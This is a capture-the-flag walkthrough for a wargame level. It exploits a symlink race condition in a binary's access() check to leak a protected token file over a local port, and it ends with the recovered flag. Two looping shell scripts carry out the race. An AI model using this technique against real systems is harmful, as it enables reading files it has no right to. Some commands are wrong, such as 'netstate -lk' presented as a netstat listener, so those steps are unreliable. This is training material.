# We have two files, a binary and a token file without right for us
#Try to execute ./level10 with token :

./level10 token

#it's say it will send file to host if we have access to it

mkdir /tmp/hack
ltrace ./level10 token /tmp/hack

#it's say we dont have access to token, with a function call access("token", 4)
#let's check if we can exploit access
#after some research it's seems we can exploit access with a race condition
#if we use the binary with a file we have access and just after switch this file to a symlink with the token we should be able to get it.
#Let's try to find out which host the binary will send the file, ltrace with a file we have right

touch /tmp/hack/token
ltrace ./level10 /tmp/hack/token localhost

#The binary seems to send the file to the port 6969
# with netstat we can see there is no process listening to this port
#We need another terminal to listen to this port
#to listen to a port we can use netstat :
netstate -lk 6969

#now if we use our file again with our first terminal:
ltrace ./level10 /tmp/hack/token localhost

# The other terminal get a message

#lNow let's go back to the race condition, we should write a script :
echo '
while [ True ]
do
        touch token
        /home/user/level10/level10 /tmp/hack/token 127.0.0.1
done
' > script.sh

# and another one that will change the value of the file :
echo '
while [ True ]
do
        rm token
        ln -s /home/user/level10/token /tmp/hack/token
done
' > script_ln.sh

# let's use a third terminal to use both script
# run both script and wait until the token appear on the terminal that listen to the port : -----> woupa2yuojeeaaed06riuj63c
